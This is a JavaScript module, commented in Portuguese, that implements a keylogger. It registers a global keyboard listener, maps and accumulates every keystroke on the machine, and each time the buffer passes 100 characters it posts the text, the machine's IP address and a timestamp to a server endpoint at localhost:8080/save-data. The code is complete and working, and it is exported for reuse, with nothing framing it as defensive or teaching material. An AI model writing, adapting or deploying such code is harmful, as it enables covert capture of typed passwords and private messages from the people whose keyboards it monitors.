import { GlobalKeyboardListener } from 'node-global-key-listener';
import axios from 'axios';
import { userIP } from './machine-ip.js';

const MAX_LENGTH = 100;
// Mapeamento de teclas para novos valores
const keyMapping = {
  'RETURN': '\n',      // Altera ENTER para uma nova linha
  'SPACE': ' ',       // Mantém SPACE como um espaço
  'COMMA': ',',       // Altera COMMA para vírgula
  'DOT': '.',         // Altera DOT para ponto
  // Adicione outros mapeamentos conforme necessário
};

// Função que inicializa o listener global de teclado
const setupKeyboardListener = async () => {
  let paragraph = ""; // Variável para armazenar o texto acumulado

  // Inicializa o listener global de teclado
  const keyboardListener = new GlobalKeyboardListener();

  // Configura o listener para todas as teclas
  keyboardListener.addListener(async (event) => {
    // Verifica se a tecla pressionada está no mapeamento
    const keyValue = keyMapping[event.name] || event.name; // Se não houver mapeamento, usa o nome original

    // Acumula o valor da tecla no parágrafo
    paragraph += keyValue; // Adiciona o valor mapeado

    // Verifica se o comprimento do parágrafo excede o máximo permitido
    if (paragraph.length > MAX_LENGTH) {
      try {
        // Define o IP (substitua 'localhost' pelo IP do usuário, se necessário)
        const userIp = userIP;

        const timestamp = new Date().toISOString(); // Formato: YYYY-MM-DDTHH:mm:ss.sssZ

        // Envia o parágrafo para o servidor
        await axios.post('http://localhost:8080/save-data', {
          ip: userIp, // Enviando o IP do usuário
          text: paragraph, // Enviando o texto acumulado
          timestamp: timestamp // Enviando a data e hora
        });

        console.log('Texto enviado:', paragraph); // Exibe a mensagem no console
        paragraph = ""; // Limpa o parágrafo após o envio
      } catch (error) {
        console.error('Erro ao enviar texto:', error);
      }
    }
    //console.log(paragraph); // Exibe o texto acumulado no console
  });
};

// Exporta a função como uma constante
const keyboardListenerSetup = setupKeyboardListener;

export { keyboardListenerSetup };
